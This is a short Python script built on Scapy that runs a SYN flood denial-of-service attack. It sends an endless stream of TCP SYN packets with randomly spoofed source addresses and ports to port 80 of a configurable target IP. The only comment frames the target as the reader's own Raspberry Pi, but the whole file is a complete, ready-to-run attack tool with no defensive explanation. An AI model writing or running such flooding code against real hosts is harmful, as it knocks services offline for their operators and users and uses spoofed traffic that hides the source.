from scapy.all import *
import random

target_ip = "10.0.0.8"  # Replace with your Raspberry Pi's IP
target_port = 80  # Default HTTP port

def syn_flood(target_ip, target_port):
    while True:
        # Generate a random source IP address
        source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        # Generate a random source port
        source_port = random.randint(1024, 65535)
        # Create SYN packet
        ip_packet = IP(src=source_ip, dst=target_ip)
        tcp_packet = TCP(sport=source_port, dport=target_port, flags="S")
        packet = ip_packet/tcp_packet
        # Send the packet
        send(packet, verbose=False)

if __name__ == "__main__":
    syn_flood(target_ip, target_port)
